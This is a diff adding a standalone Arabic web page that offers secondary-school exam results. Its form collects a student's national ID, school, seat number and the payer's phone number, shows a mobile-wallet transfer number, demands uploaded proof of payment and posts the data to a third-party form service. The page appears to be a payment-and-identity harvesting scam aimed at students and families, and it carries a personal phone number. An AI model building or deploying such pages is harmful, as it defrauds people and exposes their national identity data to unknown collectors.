@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>طلب نتيجة الثانوية</title>
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background-color: #f8f9fa;
+      padding: 30px;
+      max-width: 600px;
+      margin: auto;
+      direction: rtl;
+    }
+    h2 {
+      text-align: center;
+      color: #007bff;
+    }
+    form {
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    label {
+      display: block;
+      margin: 15px 0 5px;
+      font-weight: bold;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    input[type="file"] {
+      padding: 6px;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+    .payment-info {
+      background: #fff3cd;
+      color: #856404;
+      border: 1px solid #ffeeba;
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 15px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>طلب الحصول على النتيجة الثانوية</h2>
+
+  <form action="https://getform.io/f/ajjormra" method="POST" enctype="multipart/form-data">
+
+    <label for="national-id">الرقم القومي:</label>
+    <input type="text" id="national-id" name="الرقم القومي" required>
+
+    <label for="grade">الصف الدراسي:</label>
+    <select id="grade" name="الصف الدراسي" required>
+      <option value="الصف الأول">الصف الأول</option>
+      <option value="الصف الثاني">الصف الثاني</option>
+      <option value="الصف الثالث">الصف الثالث</option>
+    </select>
+
+    <label for="admin">الإدارة التعليمية:</label>
+    <input type="text" id="admin" name="الادارة التعليمية" required>
+
+    <label for="school">اسم المدرسة:</label>
+    <input type="text" id="school" name="اسم المدرسة" required>
+
+    <label for="seat-number">رقم الجلوس:</label>
+    <input type="text" id="seat-number" name="رقم الجلوس" required>
+
+    <label for="wallet">اكتب الرقم الي هتحول منه:</label>
+    <input type="text" id="wallet" name="اكتب الرقم الي هتحول منه" placeholder="اكتب الرقم الي هتحول منه" required>
+
+    <div class="payment-info">
+      <strong>رقم التحويل:</strong><br>
+      01274445091
+    </div>
+
+    <label for="proof">إثبات الدفع (صورة أو PDF):</label>
+    <input type="file" id="proof" name="اثبات الدفع" accept="image/*,.pdf" required>
+
+    <button type="submit">إرسال الطلب</button>
+  </form>
+
+</body>
+</html>
